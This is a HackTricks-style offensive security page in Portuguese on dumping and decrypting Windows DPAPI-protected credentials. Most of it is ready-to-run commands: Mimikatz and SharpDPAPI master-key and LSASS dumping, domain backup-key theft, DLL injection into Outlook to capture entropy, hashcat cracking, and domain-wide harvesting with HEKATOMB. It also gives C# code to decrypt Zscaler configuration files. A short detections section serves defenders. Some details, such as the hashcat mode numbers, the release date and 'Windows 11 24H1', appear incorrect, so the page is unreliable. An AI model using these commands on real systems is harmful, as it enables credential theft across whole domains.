# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## O que é DPAPI

A Data Protection API (DPAPI) é usada principalmente no sistema operativo Windows para a **criptografia simétrica de chaves privadas assimétricas**, aproveitando segredos do usuário ou do sistema como uma fonte significativa de entropia. Essa abordagem simplifica a criptografia para desenvolvedores, permitindo que encriptem dados usando uma chave derivada dos segredos de logon do usuário ou, para encriptação do sistema, dos segredos de autenticação de domínio do sistema, eliminando assim a necessidade de os desenvolvedores protegerem a chave de encriptação por conta própria.

A forma mais comum de usar o DPAPI é através das funções **`CryptProtectData` and `CryptUnprotectData`**, que permitem que aplicações encriptem e desencriptem dados de forma segura com a sessão do processo que está atualmente autenticada. Isso significa que os dados encriptados só podem ser desencriptados pelo mesmo usuário ou sistema que os encriptou.

Além disso, essas funções também aceitam um parâmetro **`entropy`** que será usado durante a encriptação e desencriptação; portanto, para desencriptar algo encriptado usando esse parâmetro, você deve fornecer o mesmo valor de entropy que foi usado durante a encriptação.

### Geração da chave do usuário

O DPAPI gera uma chave única (chamada **`pre-key`**) para cada usuário com base nas suas credenciais. Essa chave é derivada da senha do usuário e outros fatores, e o algoritmo depende do tipo de usuário, mas acaba sendo um SHA1. Por exemplo, para usuários de domínio, **depende do hash NTLM do usuário**.

Isto é especialmente interessante porque, se um atacante conseguir obter o hash da senha do usuário, ele pode:

- **Decrypt any data that was encrypted using DPAPI** com a chave desse usuário sem precisar contactar qualquer API
- Tentar **crack the password** offline tentando gerar a chave DPAPI válida

Além disso, cada vez que algum dado é encriptado por um usuário usando o DPAPI, uma nova **chave mestra** é gerada. Essa chave mestra é a que é efetivamente usada para encriptar os dados. Cada chave mestra é identificada por um **GUID (Identificador Globalmente Único)**.

As chaves mestras são armazenadas no diretório **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, onde `{SID}` é o Security Identifier desse usuário. A chave mestra é armazenada encriptada pela **`pre-key`** do usuário e também por uma **domain backup key** para recuperação (assim, a mesma chave é armazenada encriptada duas vezes por dois caminhos diferentes).

Note que a **domain key usada para encriptar a chave mestra está nos domain controllers e nunca muda**, então se um atacante tiver acesso ao domain controller, ele pode recuperar a domain backup key e desencriptar as chaves mestras de todos os usuários do domínio.

Os blobs encriptados contêm o **GUID da chave mestra** que foi usado para encriptar os dados dentro dos seus cabeçalhos.

> [!TIP]
> Blobs encriptados do DPAPI começam com **`01 00 00 00`**

Encontrar chaves mestras:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Geração da chave da máquina/sistema

Esta é a chave usada pela máquina para criptografar dados. É baseada no **DPAPI_SYSTEM LSA secret**, que é uma chave especial que somente o usuário SYSTEM pode acessar. Essa chave é usada para criptografar dados que precisam ser acessíveis pelo próprio sistema, como credenciais em nível de máquina ou segredos de todo o sistema.

Observe que essas chaves **não têm um backup de domínio**, portanto são acessíveis apenas localmente:

- **Mimikatz** pode acessá‑la despejando LSA secrets usando o comando: `mimikatz lsadump::secrets`
- O secret é armazenado dentro do registro, então um administrador poderia **modificar as permissões DACL para acessá‑lo**. O caminho do registro é: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Dados protegidos pelo DPAPI

Entre os dados pessoais protegidos pelo DPAPI estão:

- Windows creds
- Senhas e dados de auto‑completação do Internet Explorer e Google Chrome
- Senhas de e‑mail e contas FTP internas para aplicações como Outlook e Windows Mail
- Senhas para pastas compartilhadas, recursos, redes wireless e Windows Vault, incluindo chaves de criptografia
- Senhas para conexões de remote desktop, .NET Passport e chaves privadas para vários fins de criptografia e autenticação
- Senhas de rede gerenciadas por Credential Manager e dados pessoais em aplicações que usam CryptProtectData, como Skype, MSN messenger e mais
- Blobs criptografados dentro do registro
- ...

Dados protegidos pelo sistema incluem:
- Senhas de Wifi
- Senhas de tarefas agendadas
- ...

### Opções de extração da Master key

- Se o usuário tiver privilégios de domain admin, ele pode acessar a **chave de backup do domínio** para descriptografar todas as master keys dos usuários no domínio:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Com privilégios de administrador local, é possível **acessar a memória do LSASS** para extrair as chaves mestras do DPAPI de todos os usuários conectados e a chave SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Se o usuário tiver privilégios de administrador local, ele pode acessar o **DPAPI_SYSTEM LSA secret** para descriptografar as chaves mestres da máquina:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Se a senha ou o hash NTLM do usuário forem conhecidos, você pode **descriptografar diretamente as chaves mestras do usuário**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Se você estiver em uma sessão como o usuário, é possível solicitar ao DC a **backup key to decrypt the master keys using RPC**. Se você for local admin e o usuário estiver logado, você poderia **steal his session token** para isso:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Listar Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Acessar dados criptografados do DPAPI

### Encontrar dados criptografados do DPAPI

Os arquivos protegidos de usuários geralmente ficam em:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Também verifique alterando `\Roaming\` para `\Local\` nos caminhos acima.

Exemplos de enumeração:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) pode encontrar blobs criptografados DPAPI no sistema de arquivos, no registro e em blobs B64:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Observe que [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (do mesmo repositório) pode ser usado para descriptografar, usando DPAPI, dados sensíveis como cookies.

### Chaves de acesso e dados

- **Use SharpDPAPI** para obter credenciais de arquivos criptografados pelo DPAPI da sessão atual:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Obter informações de credentials** como os dados criptografados e o guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Acessar masterkeys**:

Descriptografar um masterkey de um usuário que solicitou a **domain backup key** usando RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
A ferramenta **SharpDPAPI** também suporta estes argumentos para masterkey decryption (observe como é possível usar `/rpc` para obter a domains backup key, `/password` para usar uma plaintext password, ou `/pvk` para especificar um DPAPI domain private key file...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Descriptografar dados usando uma chave mestra**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
A ferramenta **SharpDPAPI** também suporta estes argumentos para descriptografia de `credentials|vaults|rdg|keepass|triage|blob|ps` (observe como é possível usar `/rpc` para obter a chave de backup do domínio, `/password` para usar uma senha em texto claro, `/pvk` para especificar um arquivo de chave privada de domínio DPAPI, `/unprotect` para usar a sessão do usuário atual...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Descriptografar alguns dados usando a **sessão do usuário atual**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Tratando Entropia Opcional ("Entropia de terceiros")

Algumas aplicações passam um valor adicional de **entropia** para `CryptProtectData`. Sem esse valor o blob não pode ser descriptografado, mesmo que o masterkey correto seja conhecido. Obter a entropia é portanto essencial ao visar credenciais protegidas desta forma (por exemplo Microsoft Outlook, alguns clientes VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) é uma DLL em modo usuário que injeta hooks nas funções DPAPI dentro do processo alvo e registra de forma transparente qualquer entropia opcional que seja fornecida. Executar EntropyCapture em **DLL-injection** mode contra processos como `outlook.exe` ou `vpnclient.exe` irá gerar um arquivo mapeando cada buffer de entropia para o processo chamador e o blob. A entropia capturada pode depois ser fornecida ao **SharpDPAPI** (`/entropy:`) ou ao **Mimikatz** (`/entropy:<file>`) para descriptografar os dados.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft introduziu um formato de masterkey **context 3** a partir do Windows 10 v1607 (2016). `hashcat` v6.2.6 (dezembro de 2023) adicionou hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) e **22102** (context 3), permitindo cracking acelerado por GPU de senhas de usuário diretamente do arquivo masterkey. Portanto, atacantes podem realizar ataques por word-list ou brute-force sem interagir com o sistema alvo.

`DPAPISnoop` (2024) automatiza o processo:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
A ferramenta também pode analisar blobs do Credential e do Vault, decriptá-los com chaves crackeadas e exportar senhas em texto claro.


### Acessar dados de outra máquina

No **SharpDPAPI e SharpChrome** você pode indicar a opção **`/server:HOST`** para acessar os dados de uma máquina remota. Claro que você precisa conseguir acessar essa máquina e, no exemplo a seguir, supõe-se que a **chave de encriptação de backup do domínio é conhecida**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Outras ferramentas

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) é uma ferramenta que automa a extração de todos os usuários e computadores do diretório LDAP e a extração da domain controller backup key via RPC. O script então resolve todos os endereços IP dos computadores e executa smbclient em todas as máquinas para recuperar todos os DPAPI blobs de todos os usuários e descriptografar tudo com a domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Com a lista de computadores extraída do LDAP você pode encontrar todas as sub-redes mesmo que não as conhecesse!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) pode despejar segredos protegidos por DPAPI automaticamente. A versão 2.x introduziu:

* Coleta paralela de blobs de centenas de hosts
* Parser de masterkeys de **context 3** e integração automática com Hashcat para cracking
* Suporte para cookies criptografados "App-Bound" do Chrome (ver próxima seção)
* Um novo modo **`--snapshot`** para sondar repetidamente endpoints e diferenciar blobs recém-criados

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) é um parser em C# para arquivos masterkey/credential/vault que pode gerar formatos Hashcat/JtR e opcionalmente invocar o cracking automaticamente. Suporta totalmente formatos de masterkey de máquina e usuário até o Windows 11 24H1.


## Detecções comuns

- Acesso a arquivos em `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` e outros diretórios relacionados ao DPAPI.
- Especialmente a partir de um compartilhamento de rede como **C$** ou **ADMIN$**.
- Uso de **Mimikatz**, **SharpDPAPI** ou ferramentas similares para acessar a memória LSASS ou despejar masterkeys.
- Evento **4662**: *Uma operação foi executada em um objeto* – pode ser correlacionado com acesso ao objeto **`BCKUPKEY`**.
- Evento **4673/4674** quando um processo solicita *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### 2023-2025 vulnerabilidades & mudanças no ecossistema

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (novembro de 2023). Um atacante com acesso à rede poderia enganar um membro de domínio para recuperar uma chave de backup DPAPI maliciosa, permitindo a descriptografia de masterkeys de usuário. Corrigido na atualização cumulativa de novembro de 2023 – os administradores devem garantir que os DCs e estações de trabalho estejam totalmente atualizados.
* **Chrome 127 “App-Bound” cookie encryption** (julho de 2024) substituiu a proteção legada apenas por DPAPI por uma chave adicional armazenada no **Credential Manager** do usuário. A descriptografia offline de cookies agora requer tanto o masterkey DPAPI quanto a **GCM-wrapped app-bound key**. SharpChrome v2.3 e DonPAPI 2.x conseguem recuperar a chave extra quando executados no contexto do usuário.


### Estudo de caso: Zscaler Client Connector – Entropia customizada derivada do SID

Zscaler Client Connector armazena vários arquivos de configuração em `C:\ProgramData\Zscaler` (por exemplo `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Cada arquivo é criptografado com **DPAPI (Machine scope)**, mas o fornecedor fornece **custom entropy** que é *calculada em tempo de execução* em vez de ser armazenada no disco.

A entropia é reconstruída a partir de dois elementos:

1. Um segredo embutido (hard-coded) dentro de `ZSACredentialProvider.dll`.
2. O **SID** da conta Windows à qual a configuração pertence.

O algoritmo implementado pela DLL é equivalente a:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Porque o segredo está embutido em uma DLL que pode ser lida a partir do disco, **qualquer atacante local com privilégios SYSTEM pode regenerar a entropy para qualquer SID** e decrypt os blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
A descriptografia revela a configuração JSON completa, incluindo cada **device posture check** e seu valor esperado – informação muito valiosa ao tentar client-side bypasses.

> DICA: os outros artefatos criptografados (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) são protegidos com DPAPI **sem** entropia (`16` zero bytes). Eles podem, portanto, ser descriptografados diretamente com `ProtectedData.Unprotect` assim que privilégios SYSTEM forem obtidos.

## Referências

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
